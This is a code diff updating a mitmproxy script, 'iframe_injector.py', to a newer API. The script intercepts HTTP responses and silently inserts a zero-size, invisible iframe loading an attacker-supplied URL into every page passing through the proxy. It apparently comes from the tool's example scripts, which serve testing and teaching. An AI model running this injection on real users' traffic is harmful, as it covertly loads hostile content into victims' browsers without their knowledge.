@@ -3,26 +3,30 @@
 import sys
 from bs4 import BeautifulSoup
 from mitmproxy.models import decoded
+from mitmproxy import ctx
+
+iframe_url = None
 
 
-def start(context):
+def configure(options):
     if len(sys.argv) != 2:
         raise ValueError('Usage: -s "iframe_injector.py url"')
-    context.iframe_url = sys.argv[1]
+    global iframe_url
+    iframe_url = sys.argv[1]
 
 
-def response(context, flow):
-    if flow.request.host in context.iframe_url:
+def response():
+    if ctx.flow.request.host in iframe_url:
         return
-    with decoded(flow.response):  # Remove content encoding (gzip, ...)
-        html = BeautifulSoup(flow.response.content, "lxml")
+    with decoded(ctx.flow.response):  # Remove content encoding (gzip, ...)
+        html = BeautifulSoup(ctx.flow.response.content, "lxml")
         if html.body:
             iframe = html.new_tag(
                 "iframe",
-                src=context.iframe_url,
+                src=iframe_url,
                 frameborder=0,
                 height=0,
                 width=0)
             html.body.insert(0, iframe)
-            flow.response.content = str(html)
-            context.log("Iframe inserted.")
+            ctx.flow.response.content = str(html)
+            ctx.log.info("Iframe inserted.")
